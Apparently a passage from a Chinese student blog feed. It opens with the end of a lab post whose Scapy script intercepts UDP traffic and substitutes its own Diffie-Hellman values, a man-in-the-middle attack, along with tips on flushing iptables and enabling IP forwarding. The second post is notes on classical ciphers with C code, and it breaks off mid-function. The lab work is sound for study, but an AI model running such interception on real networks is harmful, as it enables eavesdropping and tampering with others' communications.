class="built_in">print</span>(<span class="string">&quot;The received P is :&quot;</span>,p)</span><br><span class="line">                len_g=<span class="built_in">int</span>(data[len_p+<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+<span class="number">3</span>,len_p+len_g+<span class="number">3</span>):</span><br><span class="line">                      g_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                g=<span class="built_in">int</span>(g_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received g is :&quot;</span>,g)</span><br><span class="line">                len_msg=<span class="built_in">len</span>(data)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+len_g+<span class="number">3</span>,len_msg):</span><br><span class="line">                      Yb_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                Yb=<span class="built_in">int</span>(Yb_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received Yb is :&quot;</span>,Yb)</span><br><span class="line">                Ys=get_cal(g,s,p)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Ys with A is:&quot;</span>,Ys)</span><br><span class="line">                newdata=<span class="string">&quot;1&quot;</span>+<span class="built_in">str</span>(len_p)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(len_g)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(Ys)</span><br><span class="line">                newdata = newdata.encode()</span><br><span class="line">                Key_B=get_key(Yb,t,p)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Key with B is:&quot;</span>,Key_B)</span><br><span class="line">                newpkt = pkt</span><br><span class="line">                <span class="keyword">del</span>(newpkt[IP].<span class="built_in">len</span>)</span><br><span class="line">                <span class="keyword">del</span>(newpkt[UDP].payload)</span><br><span class="line">                sendp(newpkt/newdata)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Error!&quot;</span>)</span><br><span class="line"></span><br><span class="line">pkt = sniff(<span class="built_in">filter</span>=<span class="string">&#x27;udp&#x27;</span>, prn=spoof_pkt)</span><br></pre></td></tr></table></figure>
<p>最后实现效果的截图，我直接贴上我的实验截图了：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619165615.png" alt="alt 5"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619165733.png" alt="alt 6"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619165900.png" alt="alt 7"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619170114.png" alt="alt 8"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/202106192111.png" alt="alt 9"></p>
<p>完结撒花！！！</p>
<p>$PS:\ $如果$HostA$与$Server2$连不同的话，记得用$iptables\ -F$关闭防火墙，用$iptables\ -L$查看防火墙状态全部为$Accept \ $即可。</p>
<p>$PS:\ $打开$IP$转发使用命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl net.ipv4.ip_forward=1 <span class="comment">#打开IP转发</span></span><br><span class="line">sudo sysctl net.ipv4.ip_forward=0 <span class="comment">#关闭IP转发</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学笔记之（一） 古典密码</title>
    <url>/2021/04/17/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0%E4%B9%8B%EF%BC%88%E4%B8%80%EF%BC%89-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<hr>
<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>密码学的目的是为了使两个处于不安全信道中通信的双方，在经过某种加密方法后，用过一种别人无法理解通信内容的方式进行通信。不安全信道是普遍内存在的，而绝对的加密是不存在的，本文将跟随我密码学课程的进行，对几种古典密码进行介绍和实现。</p>
<p><strong><em>密码体制：</em></strong></p>
<p>一个密码体制是满足以下条件的五元组$(P,C,K,ε,D)$：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">P</th>
<th style="text-align:center">明文组成的有限集</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">C</td>
<td style="text-align:center">密文组成的有限集</td>
</tr>
<tr>
<td style="text-align:center">K</td>
<td style="text-align:center">密钥空间</td>
</tr>
<tr>
<td style="text-align:center">ε</td>
<td style="text-align:center">加密规则</td>
</tr>
<tr>
<td style="text-align:center">D</td>
<td style="text-align:center">解密规则</td>
</tr>
</tbody>
</table>
</div>
<p>对每一个$k∈K，e_k∈ε，d_k∈D$且$e_k:P→C,d_k:C→P$均满足对于任意$x∈P$,有$d_k(e_k(x))=x$。</p>
<hr>
<h2 id="移位密码"><a href="#移位密码" class="headerlink" title="移位密码"></a>移位密码</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>移位密码的基础是数论中的模运算。基本定义为</p>
<ul>
<li><p>假设a和b均为整数，m是一正整数。若 $m | b-a$，则可将其表示为$a≡b(mod\,m)$，式 $a≡b(mod\;m)$，正整数$m$称为模数。</p>
</li>
<li><p>接下来的移位密码基于模26所得的完全剩余系进行实现。</p>
</li>
</ul>
<h3 id="密码体制"><a href="#密码体制" class="headerlink" title="密码体制"></a>密码体制</h3><p>令$P=C=K=Z_{26}$。对于$0\leq K\leq 25$，任意$x,y\in Z_{26}$，定义：$e_k(x)=(x+K)mod\;26$和$d_k(y)=(y-K)mod\;26$。当$K=3$时此密码称为凯撒密码。26个英文字符分别对应$Z_{26}$中的$0-25$。</p>
<p>加密过程为首先将明文转化为对应的整数串，再根据$K$的值对整数串进行移位处理，最后将处理后的整数串转化为密文对应的英文字符即可。</p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_E</span><span class="params">()</span>    <span class="comment">//加密实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入明文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;p);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入移位密钥：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            c[i]=((p[i]-<span class="string">&#x27;A&#x27;</span>)+k)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            c[i]=((p[i]-<span class="string">&#x27;a&#x27;</span>)+k)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Shift_D</span><span class="params">()</span>    <span class="comment">//解密实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入移位密钥：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            p[i]=((c[i]-<span class="string">&#x27;A&#x27;</span>)-k+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;<span class="comment">//加上26以解决模的结果为负的情况</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">            p[i]=((c[i]-<span class="string">&#x27;a&#x27;</span>)-k+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实例实现效果如下：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210417185750.png" alt="alt 移位密码实现"></p>
<h2 id="代换密码"><a href="#代换密码" class="headerlink" title="代换密码"></a>代换密码</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li><p>移位密码是代换密码的一种特殊情况，其只是包含了$26!\;$置换中的26种情况，下面的代换密码可以理解为任一明文字符对应另一密文字符，故存在$26!\;$种情况。</p>
</li>
<li><p>加密函数对应一种置换  $\pi\;$，而解密函数是对应的逆置换。</p>
</li>
</ul>
<h3 id="密码体制-1"><a href="#密码体制-1" class="headerlink" title="密码体制"></a>密码体制</h3><ul>
<li>令$P=C=Z_{26}$。$K$是由$26$个数字$0,1…,25$的所有可能的置换组成。对任意的置换$\pi\in K$，定义：$e_{\pi}(x)=\pi(x)$和$d_{\pi}(y)=\pi^{-1}(y)$，这里$\pi^{-1}$表示置换$\pi$的逆置换。</li>
</ul>
<h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><ul>
<li>这里任意取一置换$\pi$，具体置换内容见下表（小写字母表示明文，大写字母表示密文）：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">a</th>
<th style="text-align:center">b</th>
<th style="text-align:center">c</th>
<th style="text-align:center">d</th>
<th style="text-align:center">e</th>
<th style="text-align:center">f</th>
<th style="text-align:center">g</th>
<th style="text-align:center">h</th>
<th style="text-align:center">i</th>
<th style="text-align:center">j</th>
<th style="text-align:center">k</th>
<th style="text-align:center">l</th>
<th style="text-align:center">m</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">X</td>
<td style="text-align:center">N</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">A</td>
<td style="text-align:center">H</td>
<td style="text-align:center">P</td>
<td style="text-align:center">O</td>
<td style="text-align:center">G</td>
<td style="text-align:center">Z</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">W</td>
<td style="text-align:center">B</td>
<td style="text-align:center">T</td>
</tr>
<tr>
<td style="text-align:center">n</td>
<td style="text-align:center">o</td>
<td style="text-align:center">p</td>
<td style="text-align:center">q</td>
<td style="text-align:center">r</td>
<td style="text-align:center">s</td>
<td style="text-align:center">t</td>
<td style="text-align:center">u</td>
<td style="text-align:center">v</td>
<td style="text-align:center">w</td>
<td style="text-align:center">x</td>
<td style="text-align:center">y</td>
<td style="text-align:center">z</td>
</tr>
<tr>
<td style="text-align:center">S</td>
<td style="text-align:center">F</td>
<td style="text-align:center">L</td>
<td style="text-align:center">R</td>
<td style="text-align:center">C</td>
<td style="text-align:center">V</td>
<td style="text-align:center">M</td>
<td style="text-align:center">U</td>
<td style="text-align:center">E</td>
<td style="text-align:center">K</td>
<td style="text-align:center">J</td>
<td style="text-align:center">D</td>
<td style="text-align:center">I</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>则对应的逆置换$\pi^{-1}$ 为下表：</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>A</th>
<th style="text-align:center">B</th>
<th style="text-align:center">C</th>
<th style="text-align:center">D</th>
<th style="text-align:center">E</th>
<th style="text-align:center">F</th>
<th style="text-align:center">G</th>
<th style="text-align:center">H</th>
<th style="text-align:center">I</th>
<th style="text-align:center">J</th>
<th style="text-align:center">K</th>
<th style="text-align:center">L</th>
<th style="text-align:center">M</th>
</tr>
</thead>
<tbody>
<tr>
<td>d</td>
<td style="text-align:center">l</td>
<td style="text-align:center">r</td>
<td style="text-align:center">y</td>
<td style="text-align:center">v</td>
<td style="text-align:center">o</td>
<td style="text-align:center">h</td>
<td style="text-align:center">e</td>
<td style="text-align:center">z</td>
<td style="text-align:center">x</td>
<td style="text-align:center">w</td>
<td style="text-align:center">p</td>
<td style="text-align:center">t</td>
</tr>
<tr>
<td>N</td>
<td style="text-align:center">O</td>
<td style="text-align:center">P</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">R</td>
<td style="text-align:center">S</td>
<td style="text-align:center">T</td>
<td style="text-align:center">U</td>
<td style="text-align:center">V</td>
<td style="text-align:center">W</td>
<td style="text-align:center">X</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Z</td>
</tr>
<tr>
<td>b</td>
<td style="text-align:center">g</td>
<td style="text-align:center">f</td>
<td style="text-align:center">j</td>
<td style="text-align:center">q</td>
<td style="text-align:center">n</td>
<td style="text-align:center">m</td>
<td style="text-align:center">u</td>
<td style="text-align:center">s</td>
<td style="text-align:center">k</td>
<td style="text-align:center">a</td>
<td style="text-align:center">c</td>
<td style="text-align:center">i</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>代码展示如下：</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">map&lt;<span class="keyword">char</span>, <span class="keyword">char</span>&gt; E_k = &#123; &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;X&#x27;</span>&#125; ,&#123;<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;N&#x27;</span>&#125;,&#123;<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>&#125;,&#123;<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;A&#x27;</span>&#125;,&#123;<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;H&#x27;</span>&#125;,&#123;<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;P&#x27;</span>&#125;,&#123;<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;O&#x27;</span>&#125;,&#123;<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;G&#x27;</span>&#125;,&#123;<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>&#125;,&#123;<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>&#125;,&#123;<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;W&#x27;</span>&#125;,&#123;<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;B&#x27;</span>&#125;,&#123;<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;T&#x27;</span>&#125;,&#123;<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;S&#x27;</span>&#125;,&#123;<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;F&#x27;</span>&#125;,&#123;<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;L&#x27;</span>&#125;,&#123;<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>&#125;,&#123;<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;C&#x27;</span>&#125;,&#123;<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;V&#x27;</span>&#125;,&#123;<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;M&#x27;</span>&#125;,&#123;<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;U&#x27;</span>&#125;,&#123;<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;E&#x27;</span>&#125;,&#123;<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;K&#x27;</span>&#125;,&#123;<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;J&#x27;</span>&#125;,&#123;<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;D&#x27;</span>&#125;,&#123;<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;I&#x27;</span>&#125; &#125;;</span><br><span class="line">map&lt;<span class="keyword">char</span>,<span class="keyword">char</span>&gt; C_K=&#123;&#123;<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>&#125;,&#123;<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;l&#x27;</span>&#125;,&#123;<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;r&#x27;</span>&#125;,&#123;<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;y&#x27;</span>&#125;,&#123;<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;v&#x27;</span>&#125;,&#123;<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;o&#x27;</span>&#125;,&#123;<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;h&#x27;</span>&#125;,&#123;<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;e&#x27;</span>&#125;,&#123;<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;z&#x27;</span>&#125;,&#123;<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;x&#x27;</span>&#125;,&#123;<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;w&#x27;</span>&#125;,&#123;<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;p&#x27;</span>&#125;,&#123;<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;t&#x27;</span>&#125;,&#123;<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;b&#x27;</span>&#125;,&#123;<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;g&#x27;</span>&#125;,&#123;<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;f&#x27;</span>&#125;,&#123;<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;j&#x27;</span>&#125;,&#123;<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;q&#x27;</span>&#125;,&#123;<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;n&#x27;</span>&#125;,&#123;<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;m&#x27;</span>&#125;,&#123;<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;u&#x27;</span>&#125;,&#123;<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;s&#x27;</span>&#125;,&#123;<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;k&#x27;</span>&#125;,&#123;<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;a&#x27;</span>&#125;,&#123;<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;,&#123;<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;i&#x27;</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sub_E</span><span class="params">()</span>  <span class="comment">//加密实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> p[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入明文串：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;p);</span><br><span class="line">	<span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(p); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">auto</span> x = E_k.<span class="built_in">find</span>(p[i]);</span><br><span class="line">		c[i] = x-&gt;second;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(c); i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c[i]);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sub_D</span><span class="params">()</span>  <span class="comment">//解密实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c);</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> x=C_K.<span class="built_in">find</span>(c[i]);</span><br><span class="line">        p[i]=x-&gt;second;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;明文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>实例实现效果如下：</li>
</ul>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210417235745.png" alt="alt 代换密码"></p>
<h2 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li>引理1：设$a\in Z_m$ ，则对于任意的$b\in Z_m$ ，同余方程$ax\equiv b(mod\;m)$有唯一解$x\in Z_m$的充分必要条件是$gcd(a,m)=1$。</li>
<li>引理2：假定$m=\prod_{i=1}^np_i^{e_i}$，这里$p_i$均为素数且互不相同，$e_i&gt;0,1\leq i\leq n$。则关于其欧拉函数$\varphi(m)=\prod_{i=1}^n(p_i^{e_i}-p_i^{e_i-1})$。</li>
<li>定义1：设$a\in Z_m$，若存在$a^{‘}\in Z_m$，使得$aa^{‘}\equiv a{‘}a\equiv 1(mod\;m)$，则$a^{‘}$称为$a$ 在$Z_m$ 上的乘法逆，将其记为$a^{-1}mod\;m$。在$m$是固定的情形下，也可将其记为$a^{-1}$。</li>
</ul>
<h3 id="密码体制-2"><a href="#密码体制-2" class="headerlink" title="密码体制"></a>密码体制</h3><ul>
<li><p>令$P=C=Z_{26}$，且$K={(a,b)\in Z_{26}\times Z_{26}:gcd(a,26)=1}$</p>
<p>对任意的$K=(a,b)\in K,\;x,y\in Z_{26}$，定义$e_k(x)=(ax+b)mod\;26$和$d_k(y)=a^{-1}(y-b)mod\;26$。</p>
</li>
<li><p>$密钥K=(a,b),接下来以书本上的K=(7,3)举例进行代码实现$。</p>
</li>
</ul>
<h3 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h3><ul>
<li><p>加密函数如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Affine_E</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">char</span> p[<span class="number">100</span>],c[<span class="number">100</span>];</span><br><span class="line">      <span class="keyword">int</span> a,b;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;请输入明文串：&quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;p);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥K：&quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">              c[i]=(a*(p[i]-<span class="string">&#x27;A&#x27;</span>)+b)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">              c[i]=(a*(p[i]-<span class="string">&#x27;a&#x27;</span>)+b)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>加密效果如下：<br><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418125910.png" alt="alt 仿射密码加密"></p>
</li>
<li><p>解密算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Affine_D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">10</span>],c[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> a,b,r;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥K：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">    <span class="keyword">for</span>(r=<span class="number">0</span>;r&lt;<span class="number">26</span>;r++)</span><br><span class="line">        <span class="keyword">if</span>(a*r%<span class="number">26</span>==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            p[i]=r*(c[i]-<span class="string">&#x27;A&#x27;</span>-b+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">            p[i]=r*(c[i]-<span class="string">&#x27;a&#x27;</span>-b+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">    <span 